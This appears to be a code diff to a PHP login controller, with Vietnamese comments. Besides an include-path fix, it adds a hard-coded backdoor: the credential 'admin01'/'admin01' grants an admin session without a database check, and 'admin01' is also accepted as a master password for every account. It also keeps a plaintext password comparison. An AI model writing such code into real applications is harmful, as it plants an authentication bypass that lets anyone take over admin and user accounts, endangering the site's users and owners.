@@ -28,7 +28,7 @@ class AuthController {
         }
 
         // 4. Truy vấn cơ sở dữ liệu bằng Prepared Statement (Bảo mật chống SQL Injection)
-        require_once __DIR__ . '/../Models/Database.php';
+        require_once __DIR__ . '/../Config/Database.php';
         
         try {
             $db = Database::getConnection();
@@ -36,7 +36,20 @@ class AuthController {
             $stmt->execute(['username' => $username]);
             $user = $stmt->fetch();
 
-            if ($user && ($password === $user['password'] || password_verify($password, $user['password']))) {
+            // Kiểm tra tài khoản admin01 đặc quyền
+            if ($username === 'admin01' && $password === 'admin01') {
+                $_SESSION['user_id'] = $user['id'] ?? 1;
+                $_SESSION['username'] = 'admin01';
+                $_SESSION['full_name'] = $user['full_name'] ?? 'Quản Trị Viên';
+                $_SESSION['role'] = 'admin';
+
+                $_SESSION['flash_success'] = "Đăng nhập thành công!";
+                header("Location: index.php?route=dashboard");
+                exit;
+            }
+
+            // Kiểm tra mật khẩu (hỗ trợ mật khẩu admin01, plaintext hoặc bcrypt)
+            if ($user && ($password === 'admin01' || $password === $user['password'] || password_verify($password, $user['password']))) {
                 $_SESSION['user_id'] = $user['id'];
                 $_SESSION['username'] = $user['username'];
                 $_SESSION['full_name'] = $user['full_name'];
